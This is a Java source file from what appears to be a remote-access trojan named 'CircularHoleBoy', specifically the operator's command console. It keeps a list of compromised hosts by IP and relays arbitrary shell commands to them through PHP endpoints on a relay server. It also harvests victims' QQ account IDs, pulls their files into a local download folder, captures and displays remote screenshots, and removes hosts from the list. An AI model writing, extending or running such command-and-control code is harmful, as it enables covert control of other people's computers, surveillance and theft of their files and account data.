package net.wind.utils.shell;

import net.wind.BoyLoader;
import net.wind.core.Listening.ListenMain;
import net.wind.core.window.ShellWindow;
import net.wind.utils.shell.shellError.NoShellSession;
import net.wind.utils.shell.shellError.NotInSession;
import net.wind.utils.HttpUtils;
import net.wind.core.Config.MakeConfig;
import sun.misc.BASE64Decoder;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.util.Base64;
import java.util.Date;

/**
 * createTime 2022/12/3 0003
 * fileName ShellCommand
 *
 * @author WindStream
 */
interface fontColorInterFace{
    void setFontColor(String Color);
}
interface backgroundColorInterFace{
    void setBackgroundColor(String Color);
}

public class ShellCommand{
    public static String realReturn;
    public static Image ScreenShot;
    public static String command(String input) throws InterruptedException, IOException {
        realReturn = null;
        switch (input) {
            case "shell_help":
                realReturn=repOfShell.ShellHelp;
               break;
            case "shell_exit":
                System.exit(0);
                break;
            case "shell_sessions":
                int a = 1;
                String return_string ="";
                for (String Ip : BoyLoader.Host_List) {
                    return_string += (a++) + ": " + Ip + "\n";
                }
                realReturn=return_string;
                break;
            case "exit_session":
                if(NotInSession.NotInSession()) {
                  ShellWindow.Session_Status = "No Session";
                  realReturn = "Session ---> No Session\n";
                }else {
                    realReturn = "You are not in a session!\n";
                }
                break;
            default:
                if (input.split(" ")[0].toLowerCase().equals("font_color") && input.length()>11){
                    String Color = input.split(" ",2)[1];
                    //InterFace
                    fontColorInterFace fontColorInterFace = (Color1) ->  {
                        switch(Color1.toUpperCase()){
                            case "GREEN":
                                ShellWindow.WindowMainArea.setForeground(java.awt.Color.GREEN);
                                break;
                            case "YELLOW":
                                ShellWindow.WindowMainArea.setForeground(java.awt.Color.YELLOW);
                                break;
                            case "BLUE":
                                ShellWindow.WindowMainArea.setForeground(java.awt.Color.BLUE);
                                break;
                            case "CYAN":
                                ShellWindow.WindowMainArea.setForeground(java.awt.Color.CYAN);
                                break;
                            case "BLACK":
                                ShellWindow.WindowMainArea.setForeground(java.awt.Color.BLACK);
                                break;
                            case "GRAY":
                                ShellWindow.WindowMainArea.setForeground(java.awt.Color.GRAY);
                                break;
                            case "RED":
                                ShellWindow.WindowMainArea.setForeground(java.awt.Color.RED);
                                break;
                            case "PINK":
                                ShellWindow.WindowMainArea.setForeground(java.awt.Color.PINK);
                                break;
                            case "ORANGE":
                                ShellWindow.WindowMainArea.setForeground(java.awt.Color.ORANGE);
                                break;
                            case "WHITE":
                                ShellWindow.WindowMainArea.setForeground(java.awt.Color.WHITE);
                                break;
                            default:
                                realReturn = "Sorry,No Such Color \""+Color1+"\" In Circularholeboy Color Library\n";
                        }
                    };
                    fontColorInterFace.setFontColor(Color);
                }
                if (input.split(" ")[0].toLowerCase().equals("back_color") && input.length()>11){
                    String Color = input.split(" ",2)[1];
                    //InterFace
                    backgroundColorInterFace backgroundColorInterFace = (Color1) -> {
                        switch(Color1.toUpperCase()){
                            case "GREEN":
                                ShellWindow.WindowMainArea.setBackground(java.awt.Color.GREEN);
                                break;
                            case "YELLOW":
                                ShellWindow.WindowMainArea.setBackground(java.awt.Color.YELLOW);
                                break;
                            case "BLUE":
                                ShellWindow.WindowMainArea.setBackground(java.awt.Color.BLUE);
                                break;
                            case "CYAN":
                                ShellWindow.WindowMainArea.setBackground(java.awt.Color.CYAN);
                                break;
                            case "BLACK":
                                ShellWindow.WindowMainArea.setBackground(java.awt.Color.BLACK);
                                break;
                            case "GRAY":
                                ShellWindow.WindowMainArea.setBackground(java.awt.Color.GRAY);
                                break;
                            case "RED":
                                ShellWindow.WindowMainArea.setBackground(java.awt.Color.RED);
                                break;
                            case "PINK":
                                ShellWindow.WindowMainArea.setBackground(java.awt.Color.PINK);
                                break;
                            case "ORANGE":
                                ShellWindow.WindowMainArea.setBackground(java.awt.Color.ORANGE);
                                break;
                            case "WHITE":
                                ShellWindow.WindowMainArea.setBackground(java.awt.Color.WHITE);
                                break;
                            default:
                                realReturn = "Sorry,No Such Color \""+Color1+"\" In Circularholeboy Color Library\n";
                        }
                    };
                    backgroundColorInterFace.setBackgroundColor(Color);
                }
                if(ShellWindow.Session_Status.equals("No Session")){
                    if(input.length()>=13){
                    if(input.substring(0,13).equals("shell_session") == true && input.substring(13,14).equals(" ")) {
                        String ip = input.substring(14);
                        if (NoShellSession.NoShellSession(ip)==false){
                            ShellWindow.Session_Status = ip;
                            return "Connect Successfully\n";
                        }else {
                            return "No Session \" "+ip+"\"\n";
                        }
                    }
                    }else {
                        return "No command named \""+input+"\"\n";
                    }
            }else{
                    switch (input) {
                        case "shell_help":
                            realReturn=repOfShell.ShellHelp;
                            break;
                        case "shell_exit":
                            System.exit(0);
                            break;
                        case "shell_sessions":
                            int b = 1;
                            String return_stringb ="";
                            for (String Ip : BoyLoader.Host_List) {
                                return_stringb += (b++) + ": " + Ip + "\n";
                            }
                            realReturn=return_stringb;
                            break;
                        case "exit_session":
                            if(NotInSession.NotInSession()==false) {
                                ShellWindow.Session_Status = "No Session";
                                realReturn = "Session ---> No Session\n";
                            }else {
                                realReturn = "You are not in a session!\n";
                            }
                            break;
                        default:
                            //String text = Module.ModuleRoom(input);
                            //ShellWindow.WindowMainArea.append(text);
                            //ShellWindow.WindowMainArea.append("test status 1");
                    //HttpUtils.doGet(BoyLoader.phpClient+"/ServerShelltoClient.php?ip="+ShellWindow.Session_Status+"&shell="+input);
                                if (input.split(" ")[0].toLowerCase().equals("window")){
                                    HttpUtils.doPost(BoyLoader.phpClient+"/ClientPost.php?ip="+ShellWindow.Session_Status,input.split(" ",2)[1]);
                                }
                                    HttpUtils.doGet(BoyLoader.phpClient + "/ServerShelltoClient.php?ip=" + ShellWindow.Session_Status + "&shell=" + input);
                                int timeout_times=1;
                                whileBody_90:while(true){
                                    String state = null;
                                    Thread.sleep(ListenMain.reFreshtime);
                                    state = HttpUtils.doGet(BoyLoader.phpClient+"/ShellState.php?ip="+ShellWindow.Session_Status);

                                    if (state.equals("false")){
                                        timeout_times++;
                                        //System.out.println("false");
                                        if (timeout_times == 100){
                                            realReturn = "[CircularHoleBoy]: TimeOut";
                                            break;
                                        }
                                        continue whileBody_90;
                                    } else if (state.equals("true")) {
                                       break;
                                    }else {
                                        realReturn="Error: Response on " + BoyLoader.phpClient+"/ShellState.php?ip="+ShellWindow.Session_Status+" may have some mistake that we can't work.\n";
                                        break;
                                    }
                                }
                                String reply = HttpUtils.doGet(BoyLoader.phpClient + "/ServerReadClientReply.php?ip=" + ShellWindow.Session_Status);
                                String reply1 = HttpUtils.doGet(BoyLoader.phpClient + "/ServerReadPost.php?ip=" +ShellWindow.Session_Status);
                                if (input.toLowerCase().equals("getqqid")){
                                    if (reply.equals("[error1337]")){
                                        realReturn = "Target Computer Doesn't have QQ-Program";
                                    }else{
                                  String[] id = reply.split("circularholeB0yList");
                                  int i=1;
                                  String returnString = "";
                                  for (String onceID : id){
                                      if (onceID.equals("")){

                                      }else{
                                      returnString += (i++) + ": "+onceID+"\n";
                                  }}
                                  realReturn=returnString;
                                }} else if (input.toLowerCase().equals("delhost")) {
                                    if (reply.equals("Successful\n")){
                                        BoyLoader.Host_List.remove(ShellWindow.Session_Status);
                                        ShellWindow.Session_Status = "No Session";
                                        realReturn = reply;
                                    }
                                } else if (input.split(" ")[0].toLowerCase().equals("window")) {
                                    realReturn = reply;
                                } else if (input.split(" ")[0].toLowerCase().equals("download")) {
                                    if (reply1.equals("No File or PathName Named \""+input.split(" ")[1]+"\"")) {
                                       realReturn = reply1;
                                       break;
                                    }else {
                                        String FileName = reply1.split("windstream:1145141:1919810]")[0];
                                        String FileContent =reply1.split("windstream:1145141:1919810]")[1];
                                        if (MakeConfig.isHasDownloads()){
                                            MakeConfig.makeconfigDir("CirDownload");
                                        }
                                        File saveFile = new File(BoyLoader.WorkingDir+BoyLoader.sqlitSigh+"CirDownload"+BoyLoader.sqlitSigh+FileName);
                                        saveFile.createNewFile();
                                        FileWriter fileWriter = new FileWriter(saveFile);
                                        BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
                                        bufferedWriter.write(FileContent);
                                        bufferedWriter.close();
                                        fileWriter.close();
                                        realReturn = "Download to "+saveFile.getPath();
                                        break;
                                    }
                                } else if (input.toLowerCase().equals("screenshot")) {
                                    if (reply1.equals("Can't get Screen Picture")){
                                        realReturn = "Can't get Screen Picture";
                                        break;
                                    }else{
                                    BASE64Decoder Base64 = new BASE64Decoder();
                                    byte[] bytes = Base64.decodeBuffer(reply1);
                                    if (MakeConfig.isHasDownloads()){
                                        MakeConfig.makeconfigDir("CirDownload");
                                    }
                                    String SaveFileName = null;
                                    {
                                        Date date = new Date();
                                        String year=String.format("%tY",date);
                                        String month = String.format("%tm",date);
                                        String day = String.format("%td",date);
                                        String hour = String.format("%tH",date);
                                        String minute = String.format("%tM",date);
                                        String second = String.format("%tS",date);
                                        StringBuilder stringBuilder = new StringBuilder("ScreenShot");
                                        SaveFileName = stringBuilder
                                                .append(year)
                                                .append(month)
                                                .append(day)
                                                .append(hour)
                                                .append(minute)
                                                .append(second)
                                                .append(".png").toString();
                                    }
                                    String SaveImagePath = BoyLoader.WorkingDir+BoyLoader.sqlitSigh+"CirDownload"+BoyLoader.sqlitSigh+SaveFileName;
                                    File ImageFile=new File(SaveImagePath);
                                    ImageFile.createNewFile();
                                    BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(new File(SaveImagePath)));
                                    bufferedOutputStream.write(bytes);
                                    bufferedOutputStream.flush();
                                    bufferedOutputStream.close();
                                    ScreenShot = ImageIO.read(new File(SaveImagePath));
                                    JFrame jFrame = new JFrame(ShellWindow.Session_Status);
                                    jFrame.setSize(800,600);
                                    jFrame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                                    jFrame.add(new CanvasPanel());
                                    jFrame.setVisible(true);
                                    realReturn = "Save to " + SaveImagePath;
                                }} else {
                                realReturn = reply1;
                                break;
                                }
                    }
                }
        }
        if (realReturn==null){
            realReturn = "";
        }
        return realReturn;
    }
}
class CanvasPanel extends JPanel{
    public void paint(Graphics graphics){
        Graphics2D g2 = (Graphics2D) graphics;
        g2.drawImage(ShellCommand.ScreenShot,0,0,this);
    }
}